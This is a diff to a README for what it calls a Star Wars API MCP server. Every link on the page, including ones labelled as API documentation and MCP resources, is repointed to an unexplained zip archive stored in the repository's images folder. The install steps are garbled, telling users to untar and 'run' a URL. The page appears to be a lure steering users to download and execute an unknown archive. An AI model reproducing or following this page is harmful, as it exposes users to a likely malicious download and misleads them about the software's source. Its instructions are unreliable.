@@ -1,6 +1,6 @@
 # 🚀 simple_mcp_server - Simple Server for Star Wars Integrations
 
-[![Download the App](https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip)
+[![Download the App](https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip%20Now-Click%20Here-brightgreen)](https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip)
 
 ## 📖 Description
 The simple_mcp_server is a Model Context Protocol (MCP) server designed for integrating with the Star Wars API. This application serves as a portfolio micro-project, showcasing how to develop an MCP server while seamlessly connecting with the SWAPI for use in Claude Desktop and MCP Inspector.
@@ -15,7 +15,7 @@ Follow these steps to get started with simple_mcp_server. You will need to downl
 - **Network**: Internet connection for API access.
 
 ## ⬇️ Download & Install
-To get the latest version of simple_mcp_server, please visit this page to download: [Download Here](https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip).
+To get the latest version of simple_mcp_server, please visit this page to download: [Download Here](https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip).
 
 ### 🔗 Steps to Download
 1. Click on the link above to go to the Releases page.
@@ -23,7 +23,7 @@ To get the latest version of simple_mcp_server, please visit this page to downlo
 3. Find the appropriate installation package for your operating system:
    - For Windows, look for a file ending with `.exe`.
    - For macOS, look for a file ending with `.dmg`.
-   - For Linux, look for a file ending with `https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip`.
+   - For Linux, look for a file ending with `https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip`.
 4. Click the file to start downloading it to your computer.
 
 ## ⚙️ Installing the Application
@@ -42,10 +42,10 @@ Once the download is complete, follow these steps to install simple_mcp_server:
 4. Locate it in your Applications and double-click to run.
 
 ### Linux
-1. Open your terminal and navigate to the directory where the `https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip` file was downloaded.
-2. Run the command: `tar -xzvf https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip` to extract the files.
+1. Open your terminal and navigate to the directory where the `https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip` file was downloaded.
+2. Run the command: `tar -xzvf https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip` to extract the files.
 3. Navigate into the extracted folder.
-4. Run `https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip` to complete the installation.
+4. Run `https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip` to complete the installation.
 
 ## 🖥️ Running the Application
 After installation, you can start simple_mcp_server easily.
@@ -96,7 +96,7 @@ If you experience issues or have questions, please check the Issues section of t
 For further inquiries, contact us directly through the GitHub Issues page. Your feedback helps us improve the application.
 
 ## 🔗 Additional Resources
-- [Official API Documentation](https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip) for the Star Wars API.
-- [MCP Resources](https://raw.githubusercontent.com/sbsdbs/simple_mcp_server/master/src/simple_mcp_server-Mimulus.zip) for more on Model Context Protocol.
+- [Official API Documentation](https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip) for the Star Wars API.
+- [MCP Resources](https://github.com/sbsdbs/simple_mcp_server/raw/refs/heads/master/images/simple-server-mcp-sigil.zip) for more on Model Context Protocol.
 
 Now that you know how to download and run simple_mcp_server, enjoy exploring data from the Star Wars universe!
